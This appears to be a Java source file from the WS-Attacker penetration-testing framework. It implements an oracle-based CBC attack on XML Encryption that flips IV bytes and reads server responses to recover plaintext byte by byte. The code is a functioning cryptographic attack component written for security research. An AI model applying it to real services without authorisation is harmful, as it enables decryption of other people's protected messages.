/**
 * WS-Attacker - A Modular Web Services Penetration Testing Framework Copyright
 * (C) 2013 Dennis Kupser
 *
 * This program is free software; you can redistribute it and/or modify it under
 * the terms of the GNU General Public License as published by the Free Software
 * Foundation; either version 2 of the License, or (at your option) any later
 * version.
 *
 * This program is distributed in the hope that it will be useful, but WITHOUT
 * ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS
 * FOR A PARTICULAR PURPOSE. See the GNU General Public License for more
 * details.
 *
 * You should have received a copy of the GNU General Public License along with
 * this program; if not, write to the Free Software Foundation, Inc., 51
 * Franklin Street, Fifth Floor, Boston, MA 02110-1301, USA.
 */
package wsattacker.library.xmlencryptionattack.attackengine.attacker.cbc;

import java.util.LinkedList;
import wsattacker.library.xmlencryptionattack.attackengine.CryptoAttackException;
import wsattacker.library.xmlencryptionattack.attackengine.oracle.base.AOracle;
import wsattacker.library.xmlencryptionattack.attackengine.oracle.base.request.CBCOracleRequest;
import wsattacker.library.xmlencryptionattack.attackengine.oracle.base.response.OracleResponse;

/**
 * @author Juraj Somorovsky - juraj.somorovsky@rub.de
 * @version 0.1
 */
public class FindByteMethod
    extends Method
{

    private static final int FIRST_COLUMN = 1;

    private static final int SECOND_COLUMN = 2;

    private LinkedList<Byte> errorBytes;

    private LinkedList<Byte> correctBytes;

    public FindByteMethod( AOracle oracle, byte[] iv, byte[] c1 )
    {
        super( oracle, iv, c1 );
    }

    /**
     * Takes iv and cipher value, executes the attack, and returns the byte in the plaintext
     * 
     * @param i byte position in IV
     * @return the byte in the plain text
     */
    public byte executeAttack( int i )
        throws NoColumnFoundException
    {

        errorBytes = new LinkedList<Byte>();
        correctBytes = new LinkedList<Byte>();

        final byte originalByte = iv[i];

        // find the column
        int column = findColumn( iv, c1, i );

        byte byteCausingEvent;
        byte plainTextByte;

        // execute attack based on the column in the ASCII
        if ( column == FIRST_COLUMN )
        {
            // if there was searched for all bytes in the first column
            boolean searchedForAllBytes = false;
            // if no correct byte found, search for it
            if ( correctBytes.isEmpty() )
            {
                searchedForAllBytes = findCorrectByteInFirstColumn( i );
            }
            byteCausingEvent = identifyCorrectByteInFirstColumn( i, searchedForAllBytes );
            plainTextByte = (byte) ( byteCausingEvent ^ originalByte ^ correctBytes.get( 0 ) );
        }
        else
        {
            byteCausingEvent = identifyErrorByteInSecondColumn( i );
            plainTextByte = (byte) ( byteCausingEvent ^ originalByte ^ errorBytes.get( 0 ) );
        }

        iv[i] = originalByte;
        return plainTextByte;
    }

    private int findColumn( byte[] iv, byte[] c1, int i )
        throws NoColumnFoundException
    {
        // get first bit
        int firstBit = iv[i] & 0x80;
        // four columns iteration
        for ( int j = 0; j < 4; j++ )
        {
            // column half iteration
            for ( int k = 0; k < 2; k++ )
            {
                // shift the bits to get the column and its half: b00bbbbb,
                // b01bbbbb, b10bbbbb,
                // b11bbbbb
                int column = firstBit | ( j << 5 ) | ( k << 4 );
                iv[i] = (byte) column;

                CBCOracleRequest req = new CBCOracleRequest( iv, c1 );
                OracleResponse resp = m_Oracle.queryOracle( req );
                if ( resp.getResult() == OracleResponse.Result.VALID )
                {
                    correctBytes.add( iv[i] );

                }
                else
                {
                    errorBytes.add( iv[i] );
                }
            }
            if ( errorBytes.isEmpty() )
            {
                // no error found, nooot good column
                correctBytes.clear();
            }
            else if ( correctBytes.isEmpty() )
            {
                // two errors found, first column (it is not possible to get two
                // errors in the second column by editing only the b4 bit!)
                return FIRST_COLUMN;
            }
            else
            {
                // one half in the second column can have only 1 error, so if I
                // change the number in this half, I should get no error
                // message, otherwise I was in the first column
                iv[i] = (byte) ( errorBytes.get( 0 ) + 2 );
                CBCOracleRequest req = new CBCOracleRequest( iv, c1 );
                OracleResponse resp = m_Oracle.queryOracle( req );
                if ( resp.getResult() == OracleResponse.Result.VALID )
                {
                    // correct byte: I was in the second column
                    correctBytes.add( iv[i] );
                    return SECOND_COLUMN;

                }
                else
                {
                    // error byte: I was in the first column
                    errorBytes.add( iv[i] );
                    return FIRST_COLUMN;
                }
            }
        }
        throw new NoColumnFoundException( i );
    }

    /**
     * @param i
     * @return tested all bytes?
     */
    private boolean findCorrectByteInFirstColumn( int i )
    {

        int testedByte = errorBytes.get( 0 ) + 2;
        for ( int j = 0; j < 15; j++ )
        {
            if ( !correctBytes.contains( (byte) testedByte ) )
            {
                iv[i] = (byte) testedByte;
                CBCOracleRequest req = new CBCOracleRequest( iv, c1 );
                OracleResponse resp = m_Oracle.queryOracle( req );
                if ( resp.getResult() == OracleResponse.Result.VALID )
                {
                    correctBytes.add( (byte) testedByte );
                    if ( j < 14 )
                    {
                        return false;
                    }
                }
            }
            testedByte += 2;
        }
        return true;
    }

    /**
     * The pointer is now in the first column and this function allows to identify its concrete position.
     * 
     * @param i
     * @param searchedForAllBytes if we have already searched for all bytes.
     * @return
     */
    private byte identifyCorrectByteInFirstColumn( int i, boolean searchedForAllBytes )
        throws NoColumnFoundException
    {
        if ( searchedForAllBytes )
        {
            if ( correctBytes.size() == 1 )
            {
                return 10;
            }
            else if ( correctBytes.size() > 1 )
            {
                iv[i] = (byte) ( correctBytes.get( 0 ) ^ 47 );
                CBCOracleRequest req = new CBCOracleRequest( iv, c1 );
                OracleResponse resp = m_Oracle.queryOracle( req );
                if ( resp.getResult() == OracleResponse.Result.VALID )
                {
                    // it was 13 (13 xor 47 != error)
                    return 13;

                }
                else
                {
                    // it was 9 (9 xor 47 = 38 == error)
                    return 9;
                }
            }
            else
            {
                throw new NoColumnFoundException( "The column for this byte was not found properly. " + "This byte ("
                    + i + ") should probably be padded" );
            }
        }
        else
        {
            // test 9 - &
            iv[i] = (byte) ( correctBytes.get( 0 ) ^ 47 );
            CBCOracleRequest req = new CBCOracleRequest( iv, c1 );
            OracleResponse resp = m_Oracle.queryOracle( req );
            if ( resp.getResult() == OracleResponse.Result.VALID )
            {
                // test 10 - &
                iv[i] = (byte) ( correctBytes.get( 0 ) ^ 44 );
                req = new CBCOracleRequest( iv, c1 );
                resp = m_Oracle.queryOracle( req );
                if ( resp.getResult() == OracleResponse.Result.VALID )
                {
                    // else it was 13
                    return 13;
                }
                else
                {
                    // it was 10 (10 xor 44 = 38 == error)
                    return 10;

                }
            }
            else
            {
                // it was 9 (9 xor 47 = 38 == error)
                return 9;
            }
        }
    }

    /**
     * We know that our pointer is now in the second column. This means it points to & (38) or < (60). With this method
     * we can figure out which one is correct.
     * 
     * @param i
     * @return
     */
    private byte identifyErrorByteInSecondColumn( int i )
    {
        // error bytes in the second column could be caused by & (38) or < (60)
        // if the error would be caused by 38, the error would not be caused by
        // (38 XOR 43) as it is 13 (CR)
        // if the error would be caused by 60, the next error would give (60 XOR
        // 43) as it is 23 (not printable character)
        iv[i] = (byte) ( errorBytes.get( 0 ) ^ 43 );
        CBCOracleRequest req = new CBCOracleRequest( iv, c1 );
        OracleResponse resp = m_Oracle.queryOracle( req );
        if ( resp.getResult() == OracleResponse.Result.VALID )
        {
            // it was & (38)
            return 38;
        }
        else
        {
            // it was < (60)
            return 60;
        }
    }

    @Override
    public byte[] executeAttack()
        throws CryptoAttackException
    {
        throw new UnsupportedOperationException( "Not supported yet." ); // To
                                                                         // change
                                                                         // body
                                                                         // of
                                                                         // generated
                                                                         // methods,
                                                                         // choose
                                                                         // Tools
                                                                         // |
                                                                         // Templates.
    }
}